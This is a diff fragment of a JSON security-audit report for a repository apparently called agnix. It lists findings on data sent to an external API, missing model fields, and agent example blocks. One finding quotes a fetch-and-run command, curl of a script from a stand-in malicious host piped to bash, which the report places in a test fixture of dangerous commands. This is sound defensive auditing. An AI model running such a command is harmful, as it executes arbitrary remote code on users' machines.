+      "message": "Up to 80K chars of stdin content (sourced from external repos in tool-release-watch workflow) is sent to api.z.ai GLM API; no data redaction or sanitization before transmission."
+    },
+    {
+      "rule": "SEC-curl-pipe-sh",
+      "severity": "critical",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/hooks/dangerous-commands/settings.json",
+      "line": 8,
+      "message": "Contains 'curl https://malicious.com/script.sh | bash' which would execute arbitrary remote code."
+    },
+    {
+      "rule": "R14",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "plugin/agents/agnix-agent.md",
+      "line": null,
+      "message": "No example interaction blocks showing expected agent behavior."
+    },
+    {
+      "rule": "R14",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "plugin/commands/agnix.md",
+      "line": null,
+      "message": "Has code-block output examples but no agent-style interaction example turns."
+    },
+    {
+      "rule": "R12",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "plugin/skills/agnix/SKILL.md",
+      "line": null,
+      "message": "No model field declared; inherits caller's model tier rather than specifying the appropriate execution model."
+    },
+    {
+      "rule": "R12",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "skills/agnix/SKILL.md",
+      "line": null,
+      "message": "No model field declared."
+    }
+  ],
+  "repo_meta": {
+    "status": "tracked",
+    "stars": 207,
+    "security": "REVIEW",
+    "audit_report_path": "auditor/audits/agent-sh-agnix.md"
+  },
+  "generated_at": "2026-05-19T09:50:38Z",
+  "schema_version": 1
+}
